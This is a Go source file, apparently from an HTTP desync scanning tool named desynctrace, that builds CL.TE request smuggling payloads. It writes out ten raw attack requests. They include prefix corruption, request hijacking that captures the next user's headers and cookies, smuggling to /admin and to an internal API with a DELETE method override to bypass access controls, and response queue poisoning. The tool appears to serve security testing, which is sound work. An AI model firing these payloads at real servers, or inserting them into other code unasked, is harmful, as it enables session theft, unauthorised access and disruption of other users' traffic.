package vectors

import (
	"fmt"

	"github.com/byteoverride/desynctrace/internal/client"
)

type CLTEVector struct{}

func NewCLTEVector() *CLTEVector {
	return &CLTEVector{}
}

func (v *CLTEVector) Name() string {
	return "CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)"
}

func (v *CLTEVector) Type() VectorType {
	return CLTE
}

func (v *CLTEVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	payloads := []*client.Request{}

	// Basic CL.TE: 0-chunk followed by smuggled prefix
	chunkedBody := "0\r\n\r\nG"
	payloads = append(payloads, &client.Request{
		Method:           "POST",
		URL:              baseReq.URL,
		Headers:          map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		TransferEncoding: "chunked",
		Body:             []byte(chunkedBody),
		ContentLength:    int64(len(chunkedBody)),
	})

	return payloads
}

func (v *CLTEVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. Basic CL.TE — smuggle a "G" prefix to corrupt next request
	{
		body := "0\r\n\r\nG"
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-basic-g-prefix",
			Data:        []byte(raw),
			Description: "Basic CL.TE: smuggle 'G' prefix to make next request 'GGET / HTTP/1.1' → 400/501",
			Technique:   "prefix-corruption",
		})
	}

	// 2. CL.TE — smuggle a full GET request to a canary path
	{
		smuggled := fmt.Sprintf("GET /desynctrace-clte-canary HTTP/1.1\r\nHost: %s\r\nFoo: x", host)
		body := fmt.Sprintf("0\r\n\r\n%s", smuggled)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-full-get-smuggle",
			Data:        []byte(raw),
			Description: "CL.TE: smuggle complete GET to canary path",
			Technique:   "full-request-smuggle",
		})
	}

	// 3. CL.TE — incomplete chunk (timing probe)
	// No terminating 0-chunk. If backend uses TE, it hangs waiting for more chunks.
	{
		body := "1\r\nZ\r\n"
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-incomplete-chunk-timing",
			Data:        []byte(raw),
			Description: "CL.TE timing probe: incomplete chunked body causes backend timeout if it uses TE",
			Technique:   "incomplete-chunk",
		})
	}

	// 4. CL.TE — smuggle POST with body capture (request hijacking)
	// The smuggled request has a large Content-Length to capture the next user's request
	{
		smuggled := fmt.Sprintf("POST /desynctrace-capture HTTP/1.1\r\nHost: %s\r\nContent-Length: 200\r\n\r\n", host)
		body := fmt.Sprintf("0\r\n\r\n%s", smuggled)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/x-www-form-urlencoded\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-request-hijack",
			Data:        []byte(raw),
			Description: "CL.TE: smuggle POST with large CL to capture next request's headers/cookies",
			Technique:   "request-hijacking",
		})
	}

	// 5. CL.TE — smuggle with chunk extension in terminator
	{
		body := "0;ext=desynctrace\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-chunk-extension",
			Data:        []byte(raw),
			Description: "CL.TE with chunk extension on terminator",
			Technique:   "chunk-extension",
		})
	}

	// 6. CL.TE — with non-zero chunk before terminator
	{
		data := "smuggle"
		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\nGET /desynctrace-cl2 HTTP/1.1\r\nHost: %s\r\n\r\n",
			len(data), data, host)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-with-data-chunk",
			Data:        []byte(raw),
			Description: "CL.TE with a real data chunk before terminator, then smuggled request",
			Technique:   "data-chunk-smuggle",
		})
	}

	// 7. CL.TE — smuggle to internal endpoint with method override
	{
		smuggled := fmt.Sprintf("POST /api/internal HTTP/1.1\r\nHost: %s\r\nX-HTTP-Method-Override: DELETE\r\nContent-Length: 0\r\n\r\n", host)
		body := fmt.Sprintf("0\r\n\r\n%s", smuggled)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-internal-endpoint",
			Data:        []byte(raw),
			Description: "CL.TE smuggle to internal API with method override header",
			Technique:   "acl-bypass",
		})
	}

	// 8. CL.TE — with trailer injection after 0-chunk
	{
		body := "0\r\nX-Injected: true\r\n\r\nGET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-trailer-injection",
			Data:        []byte(raw),
			Description: "CL.TE with trailer header injection after terminal chunk",
			Technique:   "trailer-injection",
		})
	}

	// 9. CL.TE — double submit with two requests pipelined after chunk terminator
	{
		req1 := fmt.Sprintf("GET /first HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		req2 := fmt.Sprintf("GET /second HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("0\r\n\r\n%s%s", req1, req2)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-double-smuggle",
			Data:        []byte(raw),
			Description: "CL.TE: smuggle two complete requests at once",
			Technique:   "multi-request-smuggle",
		})
	}

	// 10. CL.TE — response queue poisoning via HEAD method
	{
		smuggled := fmt.Sprintf("HEAD /desynctrace-head HTTP/1.1\r\nHost: %s\r\n\r\n", host)
		body := fmt.Sprintf("0\r\n\r\n%s", smuggled)
		raw := fmt.Sprintf("POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Length: %d\r\n"+
			"Transfer-Encoding: chunked\r\n"+
			"Connection: keep-alive\r\n"+
			"\r\n"+
			"%s", path, host, len(body), body)
		payloads = append(payloads, RawPayload{
			Name:        "clte-response-queue-poison",
			Data:        []byte(raw),
			Description: "CL.TE: smuggle HEAD request to desync response queue (response has headers but no body, shifting all subsequent responses)",
			Technique:   "response-queue-poison",
		})
	}

	return payloads
}

func (v *CLTEVector) Verify(resp *client.Response) bool {
	if resp.StatusCode >= 400 {
		return true
	}
	return false
}
